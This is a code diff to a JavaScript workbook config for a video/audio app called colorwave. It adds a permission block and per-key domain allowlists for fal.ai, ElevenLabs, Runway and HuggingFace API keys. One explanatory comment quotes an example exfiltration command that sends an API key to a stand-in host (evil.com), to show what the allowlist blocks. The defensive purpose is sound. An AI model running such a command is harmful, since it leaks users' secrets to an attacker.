@@ -9,6 +9,16 @@ export default {
   name: "color.wave",
   slug: "colorwave",
   type: "spa",
+  // SPA-shape workbook — no Polars / Plotters / Rhai / Arrow needed.
+  // The "app" wasm variant is ~140 KB vs default ~16 MB; drops total
+  // workbook size by ~15 MB without losing anything colorwave uses.
+  // wb.* + Yjs are pure JS and unaffected by the variant choice.
+  wasmVariant: "app",
+  // hyperframes-memory tries arrowEncodeJsonRows / appendArrowIpc
+  // for compact tensor logging but feature-detects first and degrades
+  // gracefully when the arrow surface isn't in this slice. Silence
+  // the variant-coverage warning since the call sites are intentional.
+  wasmVariantCheck: false,
   version: "0.1",
   entry: "src/index.html",
   vite: {
@@ -63,6 +73,63 @@ export default {
       prompt: "sk-or-…",
       required: true,
       secret: true,
+    },
+  },
+  // Per-workbook permissions — surfaced as a one-time approval
+  // dialog the first time the daemon serves this file. Each entry's
+  // `reason` is shown verbatim; keep them human, not jargon. The
+  // daemon stores grants per workbook path so the dialog only
+  // pops once per file.
+  permissions: {
+    agents: {
+      reason:
+        "Lets you swap colorwave's built-in chat for your local Claude Code or " +
+        "Codex CLI. Runs over your subscription — your CLI's existing login is " +
+        "what authenticates; no API keys are sent.",
+    },
+    autosave: {
+      reason:
+        "Saves your edits back to this .workbook.html file as you work, so the " +
+        "composition you build is in the file you keep.",
+    },
+    secrets: {
+      reason:
+        "Stores API keys for fal.ai, ElevenLabs, Runway, or HuggingFace in your " +
+        "OS keychain — never in the file you share. Used to generate or remix " +
+        "video / audio inside this workbook.",
+    },
+    network: {
+      reason:
+        "Calls the API endpoints you've configured (e.g. queue.fal.run) on " +
+        "your behalf. Outbound HTTPS is restricted to the host allowlist " +
+        "below; nothing else gets a request from this workbook.",
+    },
+  },
+
+  // Integration keys live in the daemon's keychain (workbooksd 0.1+),
+  // not in env / localStorage. The `secrets` block declares which
+  // HTTPS hosts each key may be sent to — workbooksd refuses any
+  // /proxy call whose URL host isn't in the matching list. Strict
+  // ALLOWLIST: a malicious skill can't say
+  //   wb-fetch --secret=FAL_API_KEY https://evil.com
+  // and have the daemon helpfully forward the key. The daemon
+  // returns 403 instead.
+  secrets: {
+    FAL_API_KEY: {
+      domains: ["fal.run", "*.fal.run", "fal.media", "*.fal.media"],
+    },
+    ELEVENLABS_API_KEY: {
+      domains: ["api.elevenlabs.io"],
+    },
+    RUNWAY_API_KEY: {
+      domains: ["api.dev.runwayml.com", "api.runwayml.com"],
+    },
+    HUGGINGFACE_TOKEN: {
+      domains: [
+        "api-inference.huggingface.co",
+        "huggingface.co",
+        "*.hf.space",
+      ],
     },
   },
 };
